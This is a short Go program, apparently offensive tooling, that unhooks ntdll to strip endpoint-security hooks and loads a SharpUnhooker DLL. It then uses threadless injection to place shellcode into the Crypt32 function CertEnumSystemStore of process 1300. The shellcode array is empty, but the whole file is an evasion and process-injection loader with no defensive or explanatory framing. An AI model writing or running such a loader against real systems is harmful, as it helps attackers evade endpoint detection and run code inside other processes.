package main

import (
	"UnhookingGoLang/ThreadlessInject"
	"UnhookingGoLang/Unhook"
	"syscall"
)

func main() {
	Unhook.Ntdll()

	syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")

	shellcode := []byte{}
	ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 1300, shellcode)
}
